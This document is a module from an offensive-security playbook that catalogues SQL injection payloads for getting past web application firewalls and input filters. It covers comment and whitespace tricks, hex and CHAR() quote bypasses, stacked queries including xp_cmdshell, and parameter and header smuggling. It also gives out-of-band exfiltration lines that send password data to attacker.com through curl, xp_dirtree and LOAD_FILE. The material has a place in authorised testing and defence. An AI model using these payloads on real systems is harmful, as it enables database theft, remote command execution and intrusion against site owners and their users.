# BYPASS MODULE — SQL Injection Filter Evasion
# Layer: shared/bypass
# Load when SQLi payload is blocked by WAF or application filter

## THEORY

SQL parsers are more permissive than most filters expect.
Keywords, whitespace, and quoting rules differ between MySQL, MSSQL, PostgreSQL, SQLite, Oracle.
Know your target DB — bypasses are often DB-specific.

---

## 1. WHITESPACE SUBSTITUTES

Most filters look for keyword + space (e.g. "UNION SELECT").
SQL parsers accept many other separators:

```sql
-- MySQL
UNION/**/SELECT
UNION%09SELECT          -- tab
UNION%0ASELECT          -- newline
UNION%0DSELECT          -- carriage return
UNION%0BSELECT          -- vertical tab
UNION%0CSELECT          -- form feed
UNION/*!*/SELECT        -- MySQL version comment (empty)
UNION/*comment*/SELECT

-- MSSQL
UNION%20%20SELECT       -- double space
UNION[0x09]SELECT       -- tab (hex)

-- Multi-line comments
UN/*
*/ION SELECT

-- Parentheses as whitespace in some contexts
SELECT(username)FROM(users)
```

---

## 2. KEYWORD CASE AND FRAGMENTATION

```sql
-- Case variation
uNiOn SeLeCt
UNION SeLECT 1,2,3

-- Inline comments to split keywords
UN/**/ION SE/**/LECT
SEL/**/ECT

-- MySQL specific: /*!keyword*/ — executed as code, not comment
/*!UNION*//*!SELECT*/
/*!50000UNION*//*!50000SELECT*/   -- version-conditional: execute if >= 5.00.00
/*!32302 AND 1=1*/

-- Double keywords (when filter strips once without looping)
UNUNIONION SELSELECTECT           -- filter strips UNION/SELECT once → UNION SELECT remains
```

---

## 3. QUOTE BYPASS

```sql
-- When single quotes are filtered

-- Hex string literals (MySQL, MSSQL)
WHERE username=0x61646d696e         -- 'admin' in hex

-- CHAR() function
WHERE username=CHAR(97,100,109,105,110)   -- MySQL
WHERE username=CHAR(97)+CHAR(100)+...      -- MSSQL

-- Numeric comparison (when column is numeric)
WHERE id=1

-- Double quotes (MySQL with ANSI_QUOTES disabled)
WHERE username="admin"

-- Backslash escaping the filter's escape
-- If app does: input.replace("'", "\'")
-- Send: \' → app produces \\\' → SQL sees: \' (escaped backslash + literal quote)
INJECT: \' OR 1=1--
```

---

## 4. COMMENT STYLES BY DATABASE

```sql
-- MySQL
-- comment (double dash + space)
# comment  (hash)
/* comment */

-- MSSQL
-- comment
/* comment */

-- Oracle
-- comment
/* comment */

-- PostgreSQL
-- comment
/* comment */

-- MySQL version-conditional execution
/*!50000 UNION SELECT 1,2,3 */  -- execute only on MySQL >= 5.00.00
```

---

## 5. FUNCTION AND OPERATOR SUBSTITUTES

```sql
-- Bypass AND/OR filters
AND  →  &&   (MySQL)
OR   →  ||   (MySQL, Oracle)
=    →  LIKE, REGEXP, SOUNDS LIKE, <>, NOT IN

-- Bypass string functions
SUBSTRING → SUBSTR, MID, LEFT, RIGHT
ASCII      → ORD, HEX
CONCAT    → CONCAT_WS, GROUP_CONCAT, ||

-- Bypass UNION detection
-- Stacked queries (if supported):
'; INSERT INTO users VALUES('attacker','pass')--
'; EXEC xp_cmdshell('whoami')--   -- MSSQL

-- Blind injection without UNION
-- Boolean: AND 1=1 vs AND 1=2
-- Time: AND SLEEP(5) / WAITFOR DELAY / pg_sleep(5) / DBMS_PIPE.RECEIVE_MESSAGE

-- DNS exfiltration (out-of-band blind)
-- MySQL:
LOAD_FILE(CONCAT('\\\\',password(),'.attacker.com\\x'))
-- MSSQL:
exec master..xp_dirtree '//attacker.com/a'
-- PostgreSQL:
COPY (SELECT password FROM users LIMIT 1) TO PROGRAM 'curl https://attacker.com/?d=$(cat)'
```

---

## 6. HTTP-LEVEL SQL INJECTION BYPASS

```bash
# Parameter pollution — WAF checks first, app uses last
GET /users?id=1&id=1 UNION SELECT 1,2,3--

# JSON body — some WAFs don't parse JSON bodies for SQLi
POST /api/users
Content-Type: application/json
{"id": "1 UNION SELECT 1,2,3--"}

# Array parameters — some WAFs only check string values
POST /api/users
id[]=1 UNION SELECT 1,2,3--

# Nested parameters
POST /api/users
user[id]=1 UNION SELECT 1,2,3--

# Encoding the injection in cookie (if WAF skips cookie inspection)
Cookie: session=abc; userId=1 UNION SELECT 1,2,3--

# HTTP headers (if app reflects headers into SQL)
X-Forwarded-For: 1 UNION SELECT 1,2,3--
User-Agent: ' OR 1=1--
Referer: ' OR 1=1--
```

---

## 7. SECOND-ORDER INJECTION

Second-order injection is not blocked by input filters because the payload
is stored at write time (appears safe) and only becomes dangerous at read time.

```
Write: username = admin'-- (stored as-is, no injection at this point)
Later: SELECT * FROM logs WHERE user = '$username'
       → SELECT * FROM logs WHERE user = 'admin'--'  → injection executes
```

Detection:
  - Find any place where user-controlled data is stored
  - Find any place where stored data is used in a SQL query
  - Test: store a benign-looking payload with SQL chars, then trigger the read path

```sql
-- Payload to store (looks harmless as a username):
admin'--
' OR '1'='1
admin' UNION SELECT 1,2,3--
```

---

## 8. WAF FINGERPRINTING

Identifying the WAF helps select the right bypass:

```bash
# Headers that reveal WAF
curl -sI https://target.com/ | grep -i "x-sucuri\|x-firewall\|x-waf\|server\|cf-ray\|x-cache"

# Error page fingerprinting
curl -s "https://target.com/?x='%20UNION%20SELECT%201--" | \
  grep -i "cloudflare\|imperva\|incapsula\|akamai\|sucuri\|barracuda\|f5\|modsecurity"

# wafw00f
pip install wafw00f
wafw00f https://target.com

# Known WAF bypass resources:
# https://github.com/0xInfection/Awesome-WAF
# https://github.com/Bo0oM/WAF-bypass-cheat-sheet
```

---

## DB DETECTION PAYLOADS

Identify the database before applying DB-specific bypasses:

```sql
-- MySQL
' AND SLEEP(5)--
' AND 1=1 UNION SELECT @@version,2--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
' UNION SELECT @@version,2--
' AND 1=CONVERT(int,@@version)--

-- PostgreSQL
' AND pg_sleep(5)--
' UNION SELECT version(),2--

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--
' UNION SELECT banner,2 FROM v$version--

-- SQLite
' AND 1=randomblob(500000000)--
' UNION SELECT sqlite_version(),2--
```
